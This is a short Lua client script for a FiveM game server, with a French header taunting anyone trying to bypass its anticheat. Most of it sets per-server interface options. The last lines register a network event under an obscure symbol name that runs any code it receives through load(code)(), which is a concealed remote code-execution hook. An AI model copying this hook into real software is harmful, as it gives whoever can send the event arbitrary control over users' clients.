-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local Server = GetConvar('sv_type', 'FA')
local Servers = {
	['DEV'] = {
		uiComponents = {'infos', 'statuts'},
		crosshairDisabled = true,
		disablePopulation = false
	},
	['FA'] = {
		uiComponents = {'infos', 'statuts'},
		crosshairDisabled = false,
		disablePopulation = true
	},
	['WL'] = {
		uiComponents = {'statuts'},
		crosshairDisabled = true,
		disablePopulation = false
	}
}

exports('GetData', function(key)
	return Servers[Server][key]
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)